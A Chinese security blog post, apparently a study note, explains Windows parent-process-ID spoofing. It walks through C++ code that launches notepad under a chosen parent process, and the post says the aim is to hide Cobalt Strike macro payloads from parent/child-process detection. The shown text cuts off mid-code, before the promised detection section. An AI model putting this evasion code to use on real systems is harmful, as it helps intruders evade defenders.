<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Parent Process ID (PPID) Spoofing免杀学习 | Daily Study</title><meta name="author" content="C0KE"><meta name="copyright" content="C0KE"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Parent Process ID (PPID) Spoofing免杀学习0x00 前言本文主要内容如下：  ppid spoofing 的目的和原理 如何实现 ppid spoofing 检测 ppid spoofing 之 ETW 的使用 利用和检测工具  0x01 目的和原理PPID欺骗是一种允许攻击者选择任意进程启动其恶意程序的技术。这可以让攻击者的程序看起来是由另一个进程产生的，主要用于">
<meta property="og:type" content="article">
<meta property="og:title" content="Parent Process ID (PPID) Spoofing免杀学习">
<meta property="og:url" content="http://example.com/2024/07/10/Parent%20Process%20ID%20(PPID)%20Spoofing%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="Daily Study">
<meta property="og:description" content="Parent Process ID (PPID) Spoofing免杀学习0x00 前言本文主要内容如下：  ppid spoofing 的目的和原理 如何实现 ppid spoofing 检测 ppid spoofing 之 ETW 的使用 利用和检测工具  0x01 目的和原理PPID欺骗是一种允许攻击者选择任意进程启动其恶意程序的技术。这可以让攻击者的程序看起来是由另一个进程产生的，主要用于">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png">
<meta property="article:published_time" content="2024-07-10T04:04:54.181Z">
<meta property="article:modified_time" content="2024-07-10T07:43:40.003Z">
<meta property="article:author" content="C0KE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png"><link rel="shortcut icon" href="/img/fa.jpg"><link rel="canonical" href="http://example.com/2024/07/10/Parent%20Process%20ID%20(PPID)%20Spoofing%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Parent Process ID (PPID) Spoofing免杀学习',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-10 15:43:40'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/73c31ad1881611ebb6edd017c2d2eca2.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">370</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">53</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Daily Study"><span class="site-name">Daily Study</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Parent Process ID (PPID) Spoofing免杀学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-10T04:04:54.181Z" title="发表于 2024-07-10 12:04:54">2024-07-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-10T07:43:40.003Z" title="更新于 2024-07-10 15:43:40">2024-07-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/RE%E7%AC%94%E8%AE%B0/">RE笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Parent Process ID (PPID) Spoofing免杀学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Parent-Process-ID-PPID-Spoofing免杀学习"><a href="#Parent-Process-ID-PPID-Spoofing免杀学习" class="headerlink" title="Parent Process ID (PPID) Spoofing免杀学习"></a>Parent Process ID (PPID) Spoofing免杀学习</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文主要内容如下：</p>
<ul>
<li>ppid spoofing 的目的和原理</li>
<li>如何实现 ppid spoofing</li>
<li>检测 ppid spoofing 之 ETW 的使用</li>
<li>利用和检测工具</li>
</ul>
<h2 id="0x01-目的和原理"><a href="#0x01-目的和原理" class="headerlink" title="0x01 目的和原理"></a>0x01 目的和原理</h2><p>PPID欺骗是一种允许攻击者选择任意进程启动其恶意程序的技术。这可以让攻击者的程序看起来是由另一个进程产生的，主要用于逃避基于父&#x2F;子进程关系的检测。</p>
<p>例如，默认情况下，大多数需要用户交互启动的程序都是由<code>explorer.exe</code>生成的，比如我们在桌面新建一个<strong>文本文档</strong>，然后用记事本打开，效果如下图：</p>
<blockquote>
<p>这里会用到 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">Process Explorer</a> 或者 <a target="_blank" rel="noopener" href="https://processhacker.sourceforge.io/downloads.php">Process Hacker</a> 观察进程之间的关系。</p>
</blockquote>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-db5108387d061f9da9a86625ad69435bfad6d929.png)</p>
<p>可以看到很明显的父子关系。<code>explorer.exe</code>-&gt;<code>notepad.exe</code></p>
<p>然而，通过下面的代码，我们可以让<code>notepad.exe</code>看起来好像是由<code>onenote.exe</code>（PID：12896）产生的。</p>
<blockquote>
<p>代码的具体意思，后面会一一解释，这里先直接用。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STARTUPINFOEXA si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    SIZE_T attributeSize;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in">sizeof</span>(STARTUPINFOEXA));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 要修改这里的 pid</span></span><br><span class="line">    HANDLE parentProcessHandle = <span class="built_in">OpenProcess</span>(MAXIMUM_ALLOWED, <span class="literal">false</span>, <span class="number">12896</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">InitializeProcThreadAttributeList</span>(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</span><br><span class="line">    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)<span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), <span class="number">0</span>, attributeSize);</span><br><span class="line">    <span class="built_in">InitializeProcThreadAttributeList</span>(si.lpAttributeList, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</span><br><span class="line">    <span class="built_in">UpdateProcThreadAttribute</span>(si.lpAttributeList, <span class="number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;parentProcessHandle, <span class="built_in">sizeof</span>(HANDLE), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    si.StartupInfo.cb = <span class="built_in">sizeof</span>(STARTUPINFOEXA);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;notepad&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, EXTENDED_STARTUPINFO_PRESENT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si.StartupInfo, &amp;pi);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-cb0cb1e9a6d34b3e3b3bae844861e88bfdad379f.png)</p>
<p>咋做到的呢？这里的关键是 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcessA</a> 函数</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-28b5b0d9c1f94a3dced53e00a5a138ade227cc88.png)</p>
<p><code>CreateProcessA</code> 一般用来创建新的进程，并且默认情况下，将使用继承的父级创建进程。比如，通过 cmd 打开的，它爸爸就是cmd。但是，此函数还支持一个名为 <code>lpStartupInfo</code> 的参数，你可以在其中自定义其父进程。</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-cb54bbd2b1b1357577bf70241542cfb948a32734.png)</p>
<p><code>lpStartupInfo</code>参数指向<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-startupinfoa">STARTUPINFO</a> 和 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/ns-winbase-startupinfoexa">STARTUPINFOEX</a> 结构体。这里我们只看 <code>STARTUPINFOEX</code> 结构体，此结构体包含一个<code>lpAttributeList</code>。</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-066eb4caf94183d067722f0723003299d666b6f7.png)</p>
<p>而<code>lpAttributeList</code>是 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist">InitializeProcThreadAttributeList</a> 函数创建的。</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-1e7a41ec8c08911d1c28ada2154fb3674a49472a.png)</p>
<p>在文档下面的备注上写了，要添加属性到列表中，要调用 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute">UpdateProcThreadAttribute</a> 函数，点进去看看</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-2e1e807e4b4d99ad35cba178bf44ae6d06a434b8.png)</p>
<p>看到有个属性参数：<code>Attribute</code></p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-c4f1561a7f3739a411a3d4c4e1dd7ec68553cf35.png)</p>
<p>添加啥属性呢？<code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> 属性，设置进程的父进程。</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-2febc6e6e767dc35ce8818a8dd79fc0ce1e226d0.png)</p>
<p>有啥实际用途呢？当我们用 cs 的 office 宏生成 word 文档，受害者打开该文档上线时。</p>
<blockquote>
<p>cs 的 office 宏上线网上大把资料，这里就不具体描述了</p>
</blockquote>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-adf1a6ff15ec9f7729995c7f2dd30dd5ffecc986.png)</p>
<p>可以明显看到 word.exe 下有个 rundll32.exe</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-54a58cc79d71bf61a6043d0130b1fa3abe903d86.png)</p>
<p>蓝队的小伙伴一看到这种不正常的父子关系，就知道肯定有问题了。因此，PPID欺骗，就是为了逃避这种基于父子关系的检测的。</p>
<h2 id="0x02-实现"><a href="#0x02-实现" class="headerlink" title="0x02 实现"></a>0x02 实现</h2><p>在知道大概的原理和目的之后，我们先捋一下要调用<code>CreateProcessA</code>修改父进程的思路。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateProcessA -&gt; lpStartupInfo -&gt; STARTUPINFOEX -&gt; lpAttributeList -&gt; InitializeProcThreadAttributeList -&gt; UpdateProcThreadAttribute -&gt; PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</span><br></pre></td></tr></table></figure>

<p>有了思路之后，我们开始仔细讲讲，这个代码是怎么写出来的。其实顺着思路往下写就行了。</p>
<p>先看<code>CreateProcessA</code></p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-f40d9ffdb9bc6ed5a6ff911edfc87241dc540b01.png)</p>
<p>这里的第一个参数上程序名，第二个参数是命令行，因为我们要启动记事本，所以这里有两个选择</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接填 notepad 的路径</span></span><br><span class="line">LPCWSTR spawnProcess = <span class="string">L&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>;</span><br><span class="line"><span class="built_in">CreateProcess</span>(spawnProcess, <span class="literal">NULL</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者不填 notepad 的路径，直接填 notepad 的启动命令，我比较懒，选择了这个</span></span><br><span class="line"><span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;notepad&quot;</span>, 。。。</span><br></pre></td></tr></table></figure>

<p>第三四个参数可选，直接填NULL，第五个参数是要不要继承句柄，这里填FALSE即可，所以，现在如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;notepad&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE,。。。</span><br></pre></td></tr></table></figure>

<p>第六个参数是<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags">进程创建标记</a>，因为我们要<code>lpStartupInfo</code> 参数指向 <code>STARTUPINFOEX</code> 结构，所以这里要填<code>EXTENDED_STARTUPINFO_PRESENT</code></p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-39f3a54529b90aedb7eb011bd828573979f4e4ac.png)</p>
<p>此时为：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;notepad&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, EXTENDED_STARTUPINFO_PRESENT, 。。。</span><br></pre></td></tr></table></figure>

<p>第七八个参数，可选，直接填NULL，第九个参数是<code>lpStartupInfo</code>，<strong>先留着</strong>，第十个参数是输出用的指针，按照同样的结构定义一个即可。因此现在如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line"><span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;notepad&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, EXTENDED_STARTUPINFO_PRESENT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, 【lpStartupInfo】, &amp;pi);</span><br></pre></td></tr></table></figure>

<p>ok，现在要处理<code>【lpStartupInfo】</code>的问题了。</p>
<p><code>lpStartupInfo</code> 需要指向结构体 <code>STARTUPINFOEX</code>，那我们就声明这个结构体，并把它初始化，全部填0，如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STARTUPINFOEXA si;</span><br><span class="line"><span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in">sizeof</span>(STARTUPINFOEXA));</span><br></pre></td></tr></table></figure>

<p>结构体 <code>STARTUPINFOEX</code>里面有个参数<code>lpAttributeList</code>，需要调用函数<code>InitializeProcThreadAttributeList</code>初始化。此外，这个结构体的<code>StartupInfo</code>参数的<code>cb</code>必须设置成<code>sizeof(STARTUPINFOEX)</code></p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-26f19633ee14018e6d1436aa800d34f67ae1002f.png)</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-03a8dc6c983846395daa2eb109934e70c5f682d7.png)</p>
<p>在给<code>lpAttributeList</code>进行初始化之前，我们首先得分配内存空间，那空间大小应该是多少呢？只要给<code>InitializeProcThreadAttributeList</code>函数传入的<code>lpAttributeList</code>为NULL，就能拿到。所以现在的流程是，先调用<code>InitializeProcThreadAttributeList</code>拿到<code>lpAttributeList</code>的空间大小后，然后给<code>lpAttributeList</code>分配内存空间，接着再调用<code>InitializeProcThreadAttributeList</code>对<code>lpAttributeList</code>初始化。代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存储空间大小的变量</span></span><br><span class="line">SIZE_T attributeSize;</span><br><span class="line"><span class="comment">// 获取 lpAttributeList 的空间大小</span></span><br><span class="line"><span class="built_in">InitializeProcThreadAttributeList</span>(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</span><br><span class="line"><span class="comment">// 给 lpAttributeList 分配内存空间，直接用 HeapAlloc分配就行</span></span><br><span class="line">si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)<span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), <span class="number">0</span>, attributeSize);</span><br><span class="line"><span class="comment">// 初始化 lpAttributeList</span></span><br><span class="line"><span class="built_in">InitializeProcThreadAttributeList</span>(si.lpAttributeList, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</span><br><span class="line"><span class="comment">// 文档要求的赋值</span></span><br><span class="line">si.StartupInfo.cb = <span class="built_in">sizeof</span>(STARTUPINFOEXA);</span><br></pre></td></tr></table></figure>

<p>最后是<code>UpdateProcThreadAttribute</code> 更新<code>lpAttributeList</code>的属性为 <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code></p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-5c12947512c7e7965e3a97f55c04fc03088c4808.png)</p>
<p>第一个参数就是<code>si.lpAttributeList</code>，第二个是保留参数，必须为0，第三个参数就是更改的属性 <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code>，第六七两个参数可选，为NULL即可。第四、五个参数分别是指向属性值的指针和大小，这里填父进程的句柄（<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess</a>可以拿到）即可，如下：</p>
<blockquote>
<p>这里其实可以直接剽文档地下的 demo：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute</a><br>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-12a5836a83d830bfb5cd9e3e7c5217e15cda8cd6.png)</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HANDLE parentProcessHandle = <span class="built_in">OpenProcess</span>(MAXIMUM_ALLOWED, <span class="literal">false</span>, <span class="number">12896</span>);</span><br><span class="line"><span class="built_in">UpdateProcThreadAttribute</span>(si.lpAttributeList, <span class="number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;parentProcessHandle, <span class="built_in">sizeof</span>(HANDLE), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<p>OK，把所有代码整合起来，就是一开始贴出来的代码了。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STARTUPINFOEXA si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    SIZE_T attributeSize;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in">sizeof</span>(STARTUPINFOEXA));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 要修改这里的 pid</span></span><br><span class="line">    HANDLE parentProcessHandle = <span class="built_in">OpenProcess</span>(MAXIMUM_ALLOWED, <span class="literal">false</span>, <span class="number">12896</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">InitializeProcThreadAttributeList</span>(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>, 